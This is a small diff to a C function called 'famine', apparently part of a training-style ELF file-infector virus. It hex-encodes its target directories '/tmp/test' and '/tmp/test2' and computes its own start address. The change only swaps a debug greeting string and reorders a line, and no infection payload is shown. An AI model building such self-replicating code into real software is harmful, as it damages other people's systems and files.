@@ -25,14 +25,14 @@ void famine() {
 	uint64_t	directories[] = {0x7365742f706d742f, 0x0074, 0x7365742f706d742f, 0x003274, 0, 0};
 	char		max_path[513];
 	dirent		*d;
-	uint64_t	string = 0x000a303132333435;
+	uint64_t s = 0x0A6F6C6C6568;
 	profiling	this;
 
 	start_rip -= 0x12;
 	this = get_profiling(start_rip);
-	(void)this;
 
-	write(ret, 1, &string, sizeof(uint64_t));
+	(void)this;
+	write(ret, 1, &s, sizeof(uint64_t));
 
 	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
 		str	dir_name = (str)&directories[dir_index];
@@ -89,5 +89,5 @@ void famine() {
 			max_path[i] = 0;
 	}
 
-	write(ret, 1, &string, 8);
+	write(ret, 1, &s, sizeof(uint64_t));
 }
